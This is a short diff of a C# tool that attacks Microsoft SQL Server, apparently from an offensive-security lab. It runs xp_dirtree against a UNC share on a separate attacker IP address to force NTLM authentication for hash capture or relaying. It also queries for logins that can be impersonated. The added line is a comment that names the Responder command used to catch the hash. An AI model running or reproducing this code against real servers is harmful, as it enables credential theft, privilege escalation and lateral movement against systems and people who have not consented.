@@ -68,7 +68,7 @@ namespace MSSQL
 			// Force NTLM authentication for hash-grabbing or relaying
 			String targetShare = "\\\\192.168.49.67\\share";
 			String res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
-			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");
+			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");//responser打爆破(sudo responder -I tun0)
 
 			// Get logins that we can impersonate
 			String res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
